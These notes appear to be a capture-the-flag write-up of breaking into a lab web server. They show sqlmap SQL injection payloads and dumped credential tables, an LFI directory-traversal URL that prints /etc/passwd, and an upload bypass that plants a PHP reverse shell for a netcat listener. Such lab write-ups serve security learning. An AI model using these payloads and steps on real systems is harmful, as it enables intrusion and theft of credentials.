ENUMERATING/PLAYING AROUND WITH phpmyadmin/sql database

tried to log in to 10.10.194.73:1337/phpmyadmin/index.php

got error message:
mysqli_real_connect(): (HY000/1045): Access denied for user 'dd'@'localhost' (using password: YES)


<a href="./doc/html/index.html" - might be possible to directory traversal here

You can capture HTTP requests with Burp and then save them as files for SQLmap to run on

FOR GOBUSTER IN FUTURE USE THE /dirb/ wordlists

----

navigated to the /admin_101/ directory and made a login request with BURP Suite Proxy active 
Saved the request and ran sqlmap with it

sqlmap -r req --dump

log:

sqlmap identified the following injection point(s) with a total of 1555 HTTP(s) requests:
---
Parameter: email (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
---
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.1
available databases [6]:
[*] expose
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] sys

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
---
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.1
Database: expose
[2 tables]
+--------+
| user   |
| config |
+--------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
---
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.1
Database: expose
Table: user
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| created  | timestamp    |
| email    | varchar(512) |
| id       | int          |
| password | varchar(512) |
+----------+--------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=hacker@root.thm' AND EXTRACTVALUE(6464,CONCAT(0x5c,0x7178706a71,(SELECT (ELT(6464=6464,1))),0x71786a7871))-- aRpa&password=lol

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: email=hacker@root.thm' AND SLEEP(5)-- CLie&password=lol
---
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.1
Database: expose
Table: config
[2 entries]
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
+----+------------------------------+-----------------------------------------------------+

Database: expose
Table: user
[4 entries]
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| id                                   | email                                | created                              | password                             |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
| 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  |
| hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      |
| 1                                    | 1                                    | 1                                    | 1                                    |
| VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 |
+--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

After enumerating the SQL database, we visited the /file1010111/index.php location

Full URL - http://10.10.194.73:1337/file1010111/index.php

In this location we entered the password: easytohack
 
This led to a page that said:
Parameter Fuzzing is also important :) or Can you hide DOM elements?

Inspecting the page also gave us a hint:
Try file or view as GET parameters?

-> Next, decided to check for LFI by using:
?file=index.php:

http:/[ip]:1337/file1010111/index.php?file=index.php

By loading this while inputting the easytohack password, the page was reloaded with an apparent bug displaying.
This confirms LFI vuln. being present.

Therefore we can try out directory traversal:

http://10.10.194.73:1337/file1010111/index.php?file=../../../../etc/passwd

Inputting this with the easytohack passwd gave us the contents of the /etc/passwd file:


root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin


With this we have enumerated the user 'zeamkish' as well.

-------------------------------------------->

Next - navigated to the /upload-cv00101011/index.php location.
We input the username zeamkish to access the file upload page.


After this we got the PHP reverse shell we usually use:
https://github.com/JJkzn/HackTools/blob/main/Shells/Reverse%20PHP%20Shell

and created a file with it.

We uploaded a .png file to the upload server but used BurpSuite to replace the .png file with the php reverse shell file during the POST request.
After this we navigated to the upload point, activating the shell.php file while our netcat listener was running.
This gave us a shell.

we navigated to /home/zeamkish and got the ssh_creds.txt file:
SSH CREDS
zeamkish
easytohack@123

With these credentials we could SSH in as zeamkish and then were able to read the user flag.txt!
--------->
find / -type f -name flag.txt 2>/dev/null

To confirm the location of root flag:
/root/flag.txt
